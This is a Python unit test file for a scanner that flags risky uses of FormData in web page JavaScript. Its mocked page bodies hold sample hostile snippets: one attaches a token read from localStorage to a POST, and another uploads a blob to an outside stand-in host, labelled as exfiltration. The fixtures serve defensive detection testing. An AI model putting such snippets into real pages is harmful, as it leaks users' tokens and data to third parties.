"""Tests for FormDataSecurityScanner."""
from unittest.mock import MagicMock
from tblue.scanner.form_data_security import FormDataSecurityScanner


def _scanner():
    s = FormDataSecurityScanner.__new__(FormDataSecurityScanner)
    s.http = MagicMock()
    return s


def _resp(status=200, body="", headers=None):
    r = MagicMock()
    r.status_code = status
    r.text = body
    r.headers = headers or {}
    return r


class TestSensitiveField:
    def test_sensitive_field_fails(self):
        s = _scanner()
        body = "const fd = new FormData()\nfd.append('auth', localStorage.getItem('token'))\nfetch('/submit', {method: 'POST', body: fd})"
        s.http.get.return_value = _resp(200, body)
        results = s.scan("http://example.com")
        types = [r["type"] for r in results]
        assert "form_data_sensitive_field" in types


class TestFieldFromParam:
    def test_field_from_url_param_warns(self):
        s = _scanner()
        body = "const fd = new FormData()\nfd.append('campaign', searchParams.get('utm'))"
        s.http.get.return_value = _resp(200, body)
        results = s.scan("http://example.com")
        types = [r["type"] for r in results]
        assert "form_data_field_from_url_param" in types


class TestFileUploadExfil:
    def test_file_upload_to_external_warns(self):
        s = _scanner()
        body = "const fd = new FormData()\nfd.append('file', new Blob([data], {type: 'application/octet-stream'}))\nfetch('https://external.example.com/upload', {method: 'POST', body: fd})"
        s.http.get.return_value = _resp(200, body)
        results = s.scan("http://example.com")
        types = [r["type"] for r in results]
        assert "form_data_file_upload_exfil" in types


class TestNotUsed:
    def test_no_form_data_passes(self):
        s = _scanner()
        s.http.get.return_value = _resp(200, "<html>Normal page</html>")
        results = s.scan("http://example.com")
        assert results[0]["type"] == "form_data_not_used"

    def test_no_response_passes(self):
        s = _scanner()
        s.http.get.return_value = None
        results = s.scan("http://example.com")
        assert results[0]["status"] == "PASS"
